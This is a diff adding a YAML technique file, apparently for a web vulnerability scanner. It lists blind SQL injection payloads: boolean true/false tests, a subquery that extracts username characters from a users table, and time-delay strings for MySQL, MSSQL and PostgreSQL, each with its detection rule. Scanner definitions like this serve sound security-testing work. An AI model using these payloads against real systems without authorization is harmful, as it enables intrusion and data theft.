@@ -1,0 +1,37 @@
+techniques:
+  - id: sqli_blind_boolean
+    name: "SQL Injection - Blind Boolean"
+    vuln_type: sqli
+    description: "Boolean-based blind SQL injection"
+    severity: high
+    depth: thorough
+    tags: ["sqli", "blind", "boolean"]
+    payloads:
+      - value: "' AND 1=1--"
+        description: "True condition"
+      - value: "' AND 1=2--"
+        description: "False condition"
+      - value: "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--"
+        description: "Character extraction"
+    detection:
+      - type: string
+        value: "different_response"
+        description: "Response differs between true/false conditions"
+  - id: sqli_blind_time
+    name: "SQL Injection - Time-Based Blind"
+    vuln_type: sqli
+    description: "Time-based blind SQL injection"
+    severity: high
+    depth: thorough
+    tags: ["sqli", "blind", "time-based"]
+    payloads:
+      - value: "' AND SLEEP(5)--"
+        description: "MySQL time delay"
+      - value: "'; WAITFOR DELAY '0:0:5'--"
+        description: "MSSQL time delay"
+      - value: "' AND pg_sleep(5)--"
+        description: "PostgreSQL time delay"
+    detection:
+      - type: time_based
+        value: "5"
+        description: "Response delayed by 5+ seconds"
